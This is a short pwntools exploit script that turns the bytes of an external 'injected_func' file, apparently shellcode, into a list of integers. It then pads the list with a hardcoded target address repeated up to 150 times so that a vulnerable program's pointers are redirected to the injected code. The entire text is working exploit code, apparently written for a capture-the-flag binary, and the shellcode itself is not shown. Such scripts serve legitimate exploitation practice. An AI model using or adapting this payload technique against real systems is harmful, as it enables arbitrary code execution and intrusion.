from pwn import *

data_pointer = 0x7fffd8200000

with open("injected_func", "rb") as f:
    injected_func = f.read()

payload = " ".join(str(int.from_bytes(injected_func[i:i+4], byteorder='little')) for i in range(0, len(injected_func), 4))

# if (len(injected_func) // 4) % 2 != 0:
#     # align addresses to 64 bytes
#     payload += " 0"

ptr_low = (data_pointer & 0xFFFFFFFF)
ptr_high = ((data_pointer >> 32) & 0xFFFFFFFF)

for _ in range(len(injected_func) // 8, 150):
    payload += f" {ptr_high} {ptr_low}"

payload += " -1"

print(payload)